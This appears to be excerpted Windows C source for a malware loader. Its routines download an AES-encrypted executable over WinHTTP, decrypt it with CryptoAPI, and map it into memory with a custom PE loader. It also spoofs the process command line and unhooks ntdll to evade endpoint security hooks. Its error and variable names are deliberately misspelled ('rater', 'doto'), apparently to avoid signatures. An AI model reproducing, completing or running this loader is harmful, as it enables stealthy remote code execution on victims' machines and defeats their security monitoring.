...
void bob(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("rater in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("rater in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("rater in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("rater in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("rater in CryptDecrypt (%u)\n", GetLastError());
        return;
    }
...
DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {
    ...
    if (hSession)
        ...
        printf("rater in WinHttpConnect (%u)\n", GetLastError());
    ...
    if (hConnect)
        ...
        printf("rater in WinHttpOpenRequest (%u)\n", GetLastError());

    // Send a request.
    if (hRequest)
        resB = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("rater in WinHttpSendRequest (%u)\n", GetLastError());

    // End the request.
    if (resB)
        resB = WinHttpReceiveResponse(hRequest, NULL);
    else printf("rater in WinHttpReceiveResponse (%u)\n", GetLastError());

    // Keep checking for doto until there is nothing left.
    if (resB)
        do
        {
            // Check for available doto.
            dwSize = 0;
        ...
        {
            printf("rater in retrieving the Shellcode");
        }
...
void masqueradeCmdline()
{
    ...
    int renvoiV;
    int tete = int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i)
    {
        renvoiV = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, NULL, 0, NULL, NULL);
        tete += renvoiV;
    }

    poi_masqArgvA = (LPSTR*)LocalAlloc(LMEM_FIXED, tete);

    int bufLen = tete - int_masqCmd_Argc * sizeof(LPSTR);
    LPSTR buffer = ((LPSTR)poi_masqArgvA) + int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i)
    {
        renvoiV = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, buffer, bufLen, NULL, NULL);
...
void PELoader(char* doto, DWORD dotosize)
{

    masqueradeCmdline();

    unsigned int chksum = 0;
    for (long long i = 0; i < dotosize; i++) { chksum = doto[i] * i + chksum / 3; };

    BYTE* pImageBase = NULL;
    LPVOID preferAddr = 0;
    DWORD OldProtect = 0;
    
    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)GetNTHeaders(doto);
    if (!ntHeader) {
        exit(0);
    }
    
    IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(doto, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    ...
    // FILL the memory block with PEdoto
    ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
    memcpy(pImageBase, doto, ntHeader->OptionalHeader.SizeOfHeaders);

    IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
    {
        memcpy(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress), LPVOID(size_t(doto) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
    }
...
LPVOID getNtdll() {
    ...
    if (!bSuccess) {
        printf("rater in reading ntdll (%u)\n", GetLastError());
        return NULL;
    }
...
BOOL Unhook(LPVOID cleanNtdll) {
    ...
    for (i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {
        ...
        if (!strcmp((char*)sectionHdr->Name, txt)) {
            ...
            if (!ProtectStatus1) {
                printf("rater to change the protection (%u)\n", GetLastError());
                return FALSE;
            }
            ...
            if (!ProtectStatus2) {
                printf("rater to change the protection back (%u)\n", GetLastError());
                return FALSE;
            }
...
int main(int argc, char** argv) {
        ...
        if (!PE.doto) {
            printf("[-] rater in getting AES Encrypted PE\n");
            return -1;
        }
        ...
        printf("\n[+] Decrypt the PE \n");
        bob((char*)PE.doto, PE.len, (char*)keyData.doto, keyData.len);
        printf("\n[+] PE Decrypted\n");
